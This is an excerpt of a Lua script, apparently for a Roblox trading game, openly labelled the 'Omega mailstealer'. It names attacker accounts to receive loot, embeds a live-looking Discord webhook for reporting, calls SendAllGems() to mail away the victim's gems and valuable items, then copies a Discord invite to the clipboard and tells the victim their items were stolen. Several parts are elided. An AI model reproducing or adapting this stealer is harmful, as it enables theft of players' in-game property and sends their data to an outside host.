Username = "koroszoo"
Username2 = "surtieeeee" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1233080763029782669/l1t1yntQUXwCAx1plW09AY9ZvtrmYNGX2qdiE20umxEoeizFxJ-fWTL9Uc1d2gtvbdsT"
...
local MailMessage = "Omega On Top!"
...
local user = Username
local user2 = Username2 or "Koroszoo"
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    SendAllGems()
    setclipboard("https://discord.gg/ukwk5by8tD")
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("All your valuable items just got stolen by Omega mailstealer!\nJoin discord.gg/ukwk5by8tD")
end
